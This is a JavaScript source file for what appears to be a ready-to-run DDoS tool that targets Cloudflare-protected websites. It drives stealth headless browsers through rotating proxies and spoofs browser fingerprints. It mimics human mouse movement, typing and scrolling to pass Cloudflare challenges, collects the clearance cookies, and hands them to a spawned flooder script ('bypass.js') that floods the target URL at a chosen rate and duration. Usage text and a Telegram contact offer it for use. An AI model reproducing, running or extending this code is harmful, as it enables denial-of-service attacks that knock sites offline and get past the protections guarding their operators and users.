const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");
const {exec} = require('child_process');
const {spawn} = require("child_process");
const chalk = require('chalk');
const colors = require('colors');
const errorHandler = error => console.log(error);
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

// ==================== HÀM TIỆN ÍCH ====================
Array.prototype.remove = function(item) {
    const index = this.indexOf(item);
    if (index !== -1) this.splice(index, 1);
    return item
};

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}
const validkey = generateRandomString(5, 10);

// ==================== LOG HỆ THỐNG ====================
function log(type, string) {
    let script;
    
    switch (type) {
        case 1:
            script = "JsBrowser";
            break;
        case 2:
            script = "JsFlooder";
            break;
        default:
            script = "Status";
            break;
    }

    const d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    console.log(`(${colors.magenta.bold(script)} | ${string}`);
}

// ==================== MÔ PHỎNG HÀNH VI NGƯỜI DÙNG ====================
async function simulateHumanMouseMovement(page, element, options = {}) {
    const { minMoves = 5, maxMoves = 10, minDelay = 50, maxDelay = 150, jitterFactor = 0.1, overshootChance = 0.2, hesitationChance = 0.1, finalDelay = 500 } = options;
    const bbox = await element.boundingBox();
    if (!bbox) throw new Error('Element not visible');
    const targetX = bbox.x + bbox.width / 2;
    const targetY = bbox.y + bbox.height / 2;
    const pageDimensions = await page.evaluate(() => ({ width: window.innerWidth, height: window.innerHeight }));
    let currentX = Math.random() * pageDimensions.width;
    let currentY = Math.random() * pageDimensions.height;
    const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;
    for (let i = 0; i < moves; i++) {
        const progress = i / (moves - 1);
        let nextX = currentX + (targetX - currentX) * progress;
        let nextY = currentY + (targetY - currentY) * progress;
        nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
        nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;
        if (Math.random() < overshootChance && i < moves - 1) {
            nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
            nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY);
        }
        await page.mouse.move(nextX, nextY, { steps: 10 });
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < hesitationChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 3));
        }
        currentX = nextX;
        currentY = nextY;
    }
    await page.mouse.move(targetX, targetY, { steps: 5 });
    await new Promise(resolve => setTimeout(resolve, finalDelay));
}

async function simulateHumanTyping(page, element, text, options = {}) {
    const { minDelay = 30, maxDelay = 100, mistakeChance = 0.05, pauseChance = 0.02 } = options;
    await simulateHumanMouseMovement(page, element);
    await element.click();
    await element.evaluate(el => el.value = '');
    for (let i = 0; i < text.length; i++) {
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < mistakeChance) {
            const randomChar = String.fromCharCode(97 + Math.floor(Math.random() * 26));
            await page.keyboard.press(randomChar);
            await new Promise(resolve => setTimeout(resolve, delay * 2));
            await page.keyboard.press('Backspace');
            await new Promise(resolve => setTimeout(resolve, delay));
        }
        await page.keyboard.press(text[i]);
        if (Math.random() < pauseChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 10));
        }
    }
}

async function simulateHumanScrolling(page, distance, options = {}) {
    const { minSteps = 5, maxSteps = 15, minDelay = 50, maxDelay = 200, direction = 'down', pauseChance = 0.2, jitterFactor = 0.1 } = options;
    const directionMultiplier = direction === 'up' ? -1 : 1;
    const steps = Math.floor(Math.random() * (maxSteps - minSteps + 1)) + minSteps;
    const baseStepSize = distance / steps;
    let totalScrolled = 0;
    for (let i = 0; i < steps; i++) {
        const jitter = baseStepSize * jitterFactor * (Math.random() * 2 - 1);
        let stepSize = Math.round(baseStepSize + jitter);
        if (i === steps - 1) {
            stepSize = (distance - totalScrolled) * directionMultiplier;
        } else {
            stepSize = stepSize * directionMultiplier;
        }
        await page.evaluate((scrollAmount) => {
            window.scrollBy(0, scrollAmount);
        }, stepSize);
        totalScrolled += stepSize * directionMultiplier;
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        if (Math.random() < pauseChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 6));
        }
    }
}

async function simulateNaturalPageBehavior(page) {
    const dimensions = await page.evaluate(() => {
        return { width: document.documentElement.clientWidth, height: document.documentElement.clientHeight, scrollHeight: document.documentElement.scrollHeight };
    });
    const scrollAmount = Math.floor(dimensions.scrollHeight * (0.2 + Math.random() * 0.6));
    await simulateHumanScrolling(page, scrollAmount, { minSteps: 8, maxSteps: 15, pauseChance: 0.3 });
    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 3000));
    const movementCount = 2 + Math.floor(Math.random() * 4);
    for (let i = 0; i < movementCount; i++) {
        const x = Math.floor(Math.random() * dimensions.width * 0.8) + dimensions.width * 0.1;
        const y = Math.floor(Math.random() * dimensions.height * 0.8) + dimensions.height * 0.1;
        await page.mouse.move(x, y, { steps: 10 + Math.floor(Math.random() * 20) });
        await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
    }
    if (Math.random() > 0.5) {
        await simulateHumanScrolling(page, scrollAmount / 2, { direction: 'up', minSteps: 3, maxSteps: 8 });
    }
}

const userAgents = [
  `BROWSER-V3.0/${Math.floor(Math.random() * (135 - 122 + 1)) + 122} (Google.com ${Math.floor(Math.random() * (135 - 122 + 1)) + 122}.0; JAV; x64) AppleWebKit/537.36 (NODEJS, like Gecko) TOR/${Math.floor(Math.random() * (135 - 122 + 1)) + 122}.0.0.0 Chrome/8080`,
  `CheckHost/${Math.floor(Math.random() * (135 - 122 + 1)) + 122} (CheckHost.net ${Math.floor(Math.random() * (135 - 122 + 1)) + 122}.0; DITNHAU; XXX) AppleWebKit/537.36 (PHP, I LOVE U) COCCOC/${Math.floor(Math.random() * (135 - 122 + 1)) + 122}.0.0.0 SUNWIN/1.1.1.1`
];
const userAgent = randomElement(userAgents);

function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}

async function spoofFingerprint(page) {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(window, 'screen', {value: {width: 1920, height: 1080, availWidth: 1920, availHeight: 1080, colorDepth: 64, pixelDepth: 64}});
        Object.defineProperty(navigator, 'userAgent', {value: userAgent});
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
            const originalGetParameter = gl.getParameter;
            gl.getParameter = function(parameter) {
                if (parameter === gl.VENDOR) return 'WebKit';
                else if (parameter === gl.RENDERER) return 'Apple GPU';
                else return originalGetParameter.call(this, parameter)
            }
        }
        Object.defineProperty(navigator, 'plugins', {value: [{name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format', length: 1}]});
        Object.defineProperty(navigator, 'languages', {value: ['en-US', 'en']});
        Object.defineProperty(navigator, 'webdriver', {get: () => false});
        Object.defineProperty(navigator, 'hardwareConcurrency', {value: 4});
        Object.defineProperty(navigator, 'deviceMemory', {value: 8});
        Object.defineProperty(document, 'cookie', {configurable: true, enumerable: true, get: function() {return ''}, set: function() {}});
        Object.defineProperty(navigator, 'cookiesEnabled', {configurable: true, enumerable: true, get: function() {return true}, set: function() {}});
        Object.defineProperty(window, 'localStorage', {configurable: true, enumerable: true, value: {getItem: function() {return null}, setItem: function() {}, removeItem: function() {}}});
        Object.defineProperty(navigator, 'doNotTrack', {value: null});
        Object.defineProperty(navigator, 'maxTouchPoints', {value: 10});
        Object.defineProperty(navigator, 'language', {value: 'en-US'});
        Object.defineProperty(navigator, 'vendorSub', {value: ''})
    })
}

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

if (process.argv.length < 8) {
  console.clear();
  console.log(`
      ${colors.white.bold(`JsBrowser`)} - Fast Solver Bypass Captcha/UAM Cloudflare
      ${colors.green.bold(`Contact`)}: t.me/bixd08

      ${colors.magenta.bold(`USAGE`)}:
          node ${process.argv[1]} Target Time ThreadBrowser ThreadFlood Rate ProxyFile

      ${colors.magenta.bold(`EXAMPLE`)}:
          node ${process.argv[1]} https://captcha.nminhniee.sbs 400 5 2 30 proxy.txt
`);
  process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);
const rates = process.argv[6];
const proxyFile = process.argv[7];
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));

if (!/^https?:\/\//i.test(targetURL)) {
    log(1, `${'['.red}${'error'.bold}${']'.red} URL must start with http:// or https://`);
    process.exit(1);
}

const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/).filter(proxy => {
            const regex = /^[\w\.-]+:\d+$/;
            return regex.test(proxy);
        });
        return proxies;
    } catch (error) {
        log(1, `${'['.red}${'error'.bold}${']'.red} Error reading proxy file: ${error}`);
        return [];
    }
};

const proxies = readProxiesFromFile(proxyFile);
let cookieCount = 0;

async function solvingCaptcha(browser, page, browserProxy) {
    try {
        const title = await page.title();
        const content = await page.content();
        
        if (title === "Attention Required! | Cloudflare") {
            await browser.close();
            log(1, `${'['.red}${'error'.bold}${']'.red} Blocked by Cloudflare. Exiting.`);
            return;
        }
        
        if (content.includes("challenge-platform") || content.includes("cloudflare.challenges.com") || title === "Just a moment...") {
            log(1, `Cloudflare challenge detected`);
            log(1, `Proxy: ${browserProxy}${colors.magenta(browserProxy)} - Attempting to solve challenge...`);
            await sleep(Math.floor(Math.random() * 8) + 4);
            
            const cookies = await page.cookies();
            const hasCfChlRcMCookie = cookies.some(cookie => cookie.name === "cf_chl_rc_m");
            
            if (hasCfChlRcMCookie) {
                log(1, `Waiting page load with proxy ${browserProxy}`);
                await sleep(5);
            }

            const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
            if (captchaContainer) {
                await simulateHumanMouseMovement(page, captchaContainer, {
                    minMoves: 6, maxMoves: 15, minDelay: 30, maxDelay: 120, finalDelay: 700, jitterFactor: 18, overshootChance: 0.4, hesitationChance: 0.3
                });
                await captchaContainer.click();
                await captchaContainer.click({ offset: { x: 17, y: 20.5 } });
                await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
            }
        }
        await sleep(2);
    } catch (error) {
        throw error;
    }
}

async function RetrySolving(browser, page, browserProxy) {
    try {
        const title = await page.title();
        const content = await page.content();
        
        if (title === "Attention Required! | Cloudflare") {
            await browser.close();
            log(1, `${'['.red}${'error'.bold}${']'.red} Blocked by Cloudflare. Exiting.`);
            return;
        }
        
        if (content.includes("challenge-platform") || content.includes("cloudflare.challenges.com") || title === "Just a moment...") {
            log(1, `Cloudflare challenge detected`);
            log(1, `Proxy: ${browserProxy} - Attempting to solve challenge...`);
            await sleep(17);
            
            const cookies = await page.cookies();
            const hasCfChlRcMCookie = cookies.some(cookie => cookie.name === "cf_chl_rc_m");
            
            if (hasCfChlRcMCookie) {
                log(1, `Waiting page load with proxy ${colors.magenta(browserProxy)}`);
                await sleep(5);
            }

            const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
            if (captchaContainer) {
                await simulateHumanMouseMovement(page, captchaContainer, {
                    minMoves: 6, maxMoves: 15, minDelay: 30, maxDelay: 120, finalDelay: 700, jitterFactor: 18, overshootChance: 0.4, hesitationChance: 0.3
                });
                await captchaContainer.click();
                await captchaContainer.click({ offset: { x: 17, y: 20.5 } });
                await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
            }
        }
        await sleep(2);
    } catch (error) {
        throw error;
    }
}

async function launchBrowserWithRetry(targetURL, browserProxy, attempt = 1, maxRetries = 2) {
    let browser;
    const options = {
        headless: true,
        args: [
            `--proxy-server=${browserProxy}`,
            `--user-agent=${userAgent}`,
            '--headless=new',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--no-zygote',
            '--window-size=360,640',
            '--disable-gpu',
            '--disable-accelerated-2d-canvas',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-back-forward-cache',
            '--disable-browser-side-navigation',
            '--disable-renderer-backgrounding',
            '--disable-ipc-flooding-protection',
            '--metrics-recording-only',
            '--disable-extensions',
            '--disable-default-apps',
            '--disable-application-cache',
            '--disable-component-extensions-with-background-pages',
            '--disable-client-side-phishing-detection',
            '--disable-popup-blocking',
            '--disable-prompt-on-repost',
            '--disable-infobars',
            '--disable-breakpad',
            '--disable-field-trial-config',
            '--disable-background-networking',
            '--disable-search-engine-choice-screen',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--tls-min-version=1.2',
            '--tls-max-version=1.3',
            '--ssl-version-min=tls1.2',
            '--ssl-version-max=tls1.3',
            '--enable-quic',
            '--enable-features=PostQuantumKyber',
            '--disable-blink-features=AutomationControlled',
            '--no-first-run',
            '--test-type',
            '--allow-pre-commit-input',
            '--force-color-profile=srgb',
            '--use-mock-keychain',
            '--enable-features=NetworkService,NetworkServiceInProcess',
            '--disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding,SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure,IsolateOrigins,site-per-process'
        ],
        defaultViewport: {
            width: 360,
            height: 640,
            deviceScaleFactor: 3,
            isMobile: true,
            hasTouch: Math.random() < 0.5,
            isLandscape: false
        }
    };

    try {
        log(1, `➝ Start chrome run with addressProxy: ${colors.magenta(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();
        const client = page._client();
        await spoofFingerprint(page);

        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id }).catch(() => {});
            }
        });

        page.setDefaultNavigationTimeout(60 * 1000);
        await page.goto(targetURL, { waitUntil: "domcontentloaded" });
        await simulateNaturalPageBehavior(page);

        let captchaAttempts = 0;
        const maxCaptchaAttempts = 4;

        while (captchaAttempts < maxCaptchaAttempts) {
            await RetrySolving(browser, page, browserProxy);
            const cookies = await page.cookies(targetURL);
            const shortCookies = cookies.filter(cookie => cookie.value.length < 15);

            if (shortCookies.length === 0) {
                const title = await page.title();
                const cookieString = cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim();
                await browser.close();
                
                cookieCount++;
                console.log(`{`);
                console.log(`   ${chalk.black.bold.bgWhite('pageTitle')}: ${colors.green(title)}`);
                console.log(`   ${chalk.black.bold.bgWhite('proxyAddress')}: ${colors.green(browserProxy)}`);
                console.log(`   ${chalk.black.bold.bgWhite('userAgent')}: ${colors.green(userAgent)}`);
                console.log(`   ${chalk.black.bold.bgWhite('cookieFound')}: ${colors.green(cookieString)}`);
                console.log(`   ${chalk.black.bold.bgWhite('Total_Cookies')}: ${colors.green(cookieCount)}`);
                console.log(`},`);
                
                return {
                    title: title,
                    browserProxy: browserProxy,
                    cookies: cookieString,
                    userAgent: userAgent
                };
            }
            
            shortCookies.forEach(cookie => {
                log(1, `${'['.red}${'error'.bold}${']'.red} Error solve with cookies "${cookie.name}"`);
            });
            
            captchaAttempts++;
            log(1, `${'['.red}${'error'.bold}${']'.red} Retry${captchaAttempts} solving with proxy: ${browserProxy}`);
        }
        
        log(1, `${'['.red}${'error'.bold}${']'.red} Failed to solve captcha with proxy: ${browserProxy}`);
        await browser.close();
        
    } catch (error) {
        if (browser) {
            await browser.close().catch(() => {});
        }
        throw error;
    }
}

async function startthread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries === 1) {
        const currentTask = queue.length();
        done(null, { task, currentTask });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        if (response) {
            if (response.title === "Attention Required! | Cloudflare") {
                log(1, `${'['.red}${'error'.bold}${']'.red} Blocked by Cloudflare. Exiting.`);
                return;
            }
            
            if (!response.cookies) {
                log(1, `${'['.red}${'error'.bold}${']'.red} No cookies with proxy: ${browserProxy}`);
                return;
            }
            
            try {
                spawn("node", [
                    "bypass.js",
                    "GET",
                    targetURL,
                    duration,
                    thread,
                    rates,
                    response.browserProxy,
                    response.cookies,
                    response.userAgent
                ]);
            } catch (error) {
                log(1, `${'['.red}${'error'.bold}${']'.red} Error spawning flood.js: ${error.message}`);
            }
            
            done(null, { task });
        } else {
            await startthread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        await startthread(targetURL, browserProxy, task, done, retries + 1);
    }
}

const queue = async.queue(function(task, done) {
    startthread(targetURL, task.browserProxy, task, done)
}, threads);

queue.drain(function() {
    log(1, `${'JsBrowser & JsFlooder Has End'.bold}`);
    process.exit(1)
});

async function main() {
    if (proxies.length === 0) {
        log(1, `${'['.red}${'error'.bold}${']'.red} No proxies found in file. Exiting.`);
        process.exit(1)
    }
    
    log(1, "Running...");
    log(1, `Target: ${targetURL}`);
    log(1, `Duration: ${duration} seconds`);
    log(1, `Threads Browser: ${threads}`);
    log(1, `Threads Flooder: ${thread}`);
    log(1, `Rates Flooder: ${rates}`);
    log(1, `Proxies: ${proxies.length} | Filename: ${proxyFile}`);
    
    for (let i = 0; i < proxies.length; i++) {
        const browserProxy = proxies[i];
        queue.push({browserProxy: browserProxy})
    }
    
    setTimeout(() => {
        log(1, "Time's up! Cleaning up...");
        queue.kill();
        exec('pkill -f bypass.js', (err) => {
            if (err && err.code !== 1) {
                // Ignore errors
            } else {
                log(1, "Successfully killed flood.js processes")
            }
        });
        exec('pkill -f chrome', (err) => {
            if (err && err.code !== 1) {
                // Ignore errors
            } else {
                log(1, "Successfully killed Chrome processes")
            }
        });
        setTimeout(() => {
            log(1, "Exiting");
            process.exit(0)
        }, 5000)
    }, duration * 1000)
}

console.clear();
main().catch(err => {
    log(1, `${'['.red}${'error'.bold}${']'.red} Main function error: ${err.message}`);
    process.exit(1)
});
